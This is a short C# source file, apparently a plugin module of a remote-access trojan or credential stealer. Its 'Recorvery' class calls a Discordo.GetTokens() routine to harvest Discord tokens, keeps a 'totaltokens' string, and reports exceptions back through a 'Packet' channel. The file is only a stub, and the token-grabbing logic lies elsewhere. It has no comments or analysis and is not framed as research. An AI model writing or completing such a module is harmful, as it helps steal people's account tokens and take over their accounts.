using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;

namespace Plugin
{
    class Recorvery
    {
        public static string totaltokens = "";
        public static void Recorver()
        {
            try
            {
                Discordo.GetTokens();
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Exception: " + ex.Message + ex.StackTrace);
            }
        }
    }
}
